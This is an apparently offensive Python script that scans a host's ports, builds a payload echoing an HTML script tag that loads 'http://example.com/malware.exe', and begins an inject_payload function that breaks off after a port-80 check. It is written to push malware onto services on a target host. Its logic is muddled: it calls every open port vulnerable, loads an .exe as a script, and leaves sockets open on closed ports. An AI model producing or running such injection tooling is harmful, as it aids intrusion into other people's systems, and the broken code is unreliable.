#!/usr/bin/env python3

import sys
import socket
import requests
import urllib.parse as urlparse
import urllib.request as urllib2
from bs4 import BeautifulSoup

def scan_ports(host, start_port, end_port):
    vulnerable_ports = []
    for port in range(start_port, end_port+1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        if result == 0:
            vulnerable_ports.append(port)
            sock.close()
    return vulnerable_ports

def create_payload():
    malware_url = "http://example.com/malware.exe"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
    }
    payload = {
        "command": "echo <html><body><script src='{}'></script></body></html>".format(malware_url)
    }
    return payload, headers

def inject_payload(host, port, payload, headers):
    url = "http://{}:{}".format(host, port)
    if port == 80:
